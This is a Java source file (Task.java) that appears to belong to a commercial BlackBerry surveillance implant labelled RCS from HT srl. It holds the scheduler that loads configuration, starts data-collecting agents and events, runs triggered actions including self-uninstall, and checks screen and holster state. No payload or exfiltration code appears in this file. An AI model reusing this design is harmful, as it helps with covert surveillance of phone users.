//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Task.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Date;
import java.util.Timer;
import java.util.Vector;

import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.DeviceInfo;
import blackberry.action.Action;
import blackberry.action.SubAction;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.Singleton;
import blackberry.log.LogCollector;
import blackberry.utils.Check;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Task.
 */
public final class Task implements Singleton {

    private static final int SLEEPING_TIME = 1000;
    private static final long APP_TIMER_PERIOD = 1000;

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);

    //#endif

    /**
     * Gets the single instance of Task.
     * 
     * @return single instance of Task
     */
    public static synchronized Task getInstance() {
        if (instance == null) {
            instance = new Task();
        }
        return instance;
    }

    /** The conf. */
    Conf conf;

    /** The status. */
    Status status;

    /** The device. */
    Device device;

    /** The log collector. */
    LogCollector logCollector;

    /** The event manager. */
    EventManager eventManager;

    /** The agent manager. */
    AgentManager agentManager;
    Timer applicationTimer;

    // ApplicationUpdateTask();

    AppUpdateManager appUpdateManager;

    private static Task instance;

    /**
     * Instantiates a new task.
     */
    private Task() {
        status = Status.getInstance();
        device = Device.getInstance();
        logCollector = LogCollector.getInstance();

        eventManager = EventManager.getInstance();
        agentManager = AgentManager.getInstance();

        //#ifdef DEBUG_TRACE
        debug.trace("Task created");

        //#endif
    }

    Date lastActionCheckedStart;
    Date lastActionCheckedEnd;
    int lastActionCheckedId;

    /**
     * Check actions.
     * 
     * @return true, if successful
     */
    public boolean checkActions() {
        Utils.sleep(1000);

        try {
            for (;;) {

                lastActionCheckedStart = new Date();

                //#ifdef DEBUG_TRACE
                // debug.trace("checkActions");
                //#endif
                final int[] actionIds = status.getActionIdTriggered();

                final int asize = actionIds.length;
                if (asize > 0) {

                    for (int k = 0; k < asize; ++k) {
                        final int actionId = actionIds[k];

                        lastActionCheckedId = actionId;

                        final Action action = status.getAction(actionId);

                        if (action.isTriggered() == false) {
                            //#ifdef DEBUG
                            debug.warn("Should be triggered: " + action);
                            //#endif
                            continue;
                        }

                        //#ifdef DEBUG_TRACE
                        debug.trace("CheckActions() triggered: " + action);
                        //#endif
                        action.setTriggered(false, null);

                        final Vector subActions = action.getSubActionsList();
                        final int ssize = subActions.size();

                        for (int j = 0; j < ssize; ++j) {

                            try {
                                final SubAction subAction = (SubAction) subActions
                                        .elementAt(j);
                                //#ifdef DBC
                                Check.asserts(subAction != null,
                                        "checkActions: subAction!=null");
                                //#endift

                                final boolean ret = subAction.execute(action
                                        .getTriggeringEvent());

                                if (subAction.wantUninstall()) {
                                    //#ifdef DEBUG
                                    debug.warn("CheckActions() uninstalling");
                                    //#endif
                                    agentManager.stopAll();
                                    eventManager.stopAll();
                                    status.unTriggerAll();
                                    return false;
                                }

                                if (subAction.wantReload()) {
                                    status.setRestarting(true);
                                    //#ifdef DEBUG
                                    debug.warn("checkActions: reloading");
                                    //#endif
                                    status.unTriggerAll();
                                    //#ifdef DEBUG_TRACE
                                    debug.trace("checkActions: stopping agents");
                                    //#endif
                                    agentManager.stopAll();
                                    //#ifdef DEBUG_TRACE
                                    debug.trace("checkActions: stopping events");
                                    //#endif
                                    eventManager.stopAll();
                                    Utils.sleep(2000);
                                    //#ifdef DEBUG_TRACE
                                    debug.trace("checkActions: untrigger all");
                                    //#endif
                                    status.unTriggerAll();
                                    return true;
                                }

                                if (ret == false) {
                                    //#ifdef DEBUG
                                    debug
                                            .warn("CheckActions() error executing: "
                                                    + subAction);
                                    //#endif
                                    continue;
                                }
                            } catch (final Exception ex) {
                                //#ifdef DEBUG_ERROR
                                debug.error("checkActions for: " + ex);
                                //#endif
                            }
                        }
                    }
                }
                lastActionCheckedEnd = new Date();

                Utils.sleep(SLEEPING_TIME);
            }
        } catch (Throwable ex) {
            // catching trowable should break the debugger anc log the full stack trace
            //#ifdef DEBUG_FATAL
            debug.fatal("checkActions error, restart: " + ex);
            //#endif
            return true;
        }
    }

    /*
     * private boolean lastBacklight = false;
     * private synchronized void notifyBacklight(boolean backlight) {
     * if(backlight!=lastBacklight){
     * lastBacklight=backlight;
     * AppListener.getInstance().backlightStateChange(backlight);
     * }
     * }
     */

    /**
     * Start application timer.
     */
    synchronized void startApplicationTimer() {
        //#ifdef DEBUG_INFO
        debug.info("startApplicationTimer");
        //#endif

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
            appUpdateManager = null;
        }

        applicationTimer = new Timer();
        appUpdateManager = new AppUpdateManager();
        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
                APP_TIMER_PERIOD);
    }

    /**
     * Stop application timer.
     */
    synchronized void stopApplicationTimer() {
        //#ifdef DEBUG_INFO
        debug.info("stopApplicationTimer");
        //#endif
        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
            appUpdateManager = null;
        }
    }

    /**
     * Start application timer.
     */
    synchronized void resumeApplicationTimer() {
        //#ifdef DEBUG_INFO
        debug.info("resumeApplicationTimer");
        //#endif

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }
        applicationTimer = new Timer();

        if (appUpdateManager == null) {
            appUpdateManager = new AppUpdateManager();
        } else {
            appUpdateManager = new AppUpdateManager(appUpdateManager);
        }

        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
                APP_TIMER_PERIOD);

    }

    /**
     * Stop application timer.
     */
    synchronized void suspendApplicationTimer() {
        //#ifdef DEBUG_INFO
        debug.info("suspendApplicationTimer");
        //#endif
        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }
    }

    /**
     * Dice se l'application timer e' attivo e funzionante.
     * Se e'
     * 
     * @return true se funziona
     */

    public synchronized boolean verifyTimers() {
        boolean ret = true;
        if (!Backlight.isEnabled()) {
            return true;
        }
        
        if (lastActionCheckedEnd != null && lastActionCheckedStart != null) {
            long lastActionElapse = lastActionCheckedEnd.getTime()
                    - lastActionCheckedStart.getTime();
            if (lastActionElapse > 60 * 1000) {
                //#ifdef DEBUG_WARN
                debug.warn("lastAction stuck by: " + lastActionCheckedId
                        + " elapsed:" + lastActionCheckedId);
                //#endif
                ret = false;
            }
        }else{
            //#ifdef DEBUG_WARN
            debug.warn("lastActionCheckedEnd || lastActionCheckedStart == null");
            //#endif
        }

        if (applicationTimer == null) {
            //#ifdef DEBUG_WARN
            debug.warn("applicationTimer == null");
            //#endif
            ret = false;
        }

        if (appUpdateManager == null) {
            //#ifdef DEBUG_WARN
            debug.warn("appUpdateManager == null");
            //#endif
            ret = false;
        }

        //#ifdef DEBUG_TRACE
        debug.trace("verifyTimers: " + ret + " lastActionCheckedStart:" +lastActionCheckedStart);
        //#endif

        return ret;
    }

    /**
     * Task init.
     * 
     * @return true, if successful
     */
    public boolean taskInit() {
        //#ifdef DEBUG_TRACE
        debug.trace("TaskInit");
        //#endif

        //agentManager.stopAll();
        //eventManager.stopAll();

        if (device != null) {
            device.refreshData();
        }

        conf = new Conf();

        if (conf.load() == false) {
            //#ifdef DEBUG_TRACE
            debug.trace("Load Conf FAILED");
            //#endif

            return false;
        }

        if (logCollector != null) {
            logCollector.initLogs();
        }

        // Da qui in poi inizia la concorrenza dei thread

        if (eventManager.startAll() == false) {
            //#ifdef DEBUG_TRACE
            debug.trace("eventManager FAILED");
            //#endif
            return false;
        }

        //#ifdef DEBUG_INFO
        debug.info("Events started");

        //#endif

        if (agentManager.startAll() == false) {
            //#ifdef DEBUG_TRACE
            debug.trace("agentManager FAILED");
            //#endif
            return false;
        }

        if (!DeviceInfo.isInHolster()) {
            //#ifdef DEBUG_TRACE
            debug.trace("going to start ApplicationTimer");
            //#endif
            startApplicationTimer();
        }

        //#ifdef DEBUG_INFO
        debug.info("Agents started");

        //#endif
        return true;
    }
}
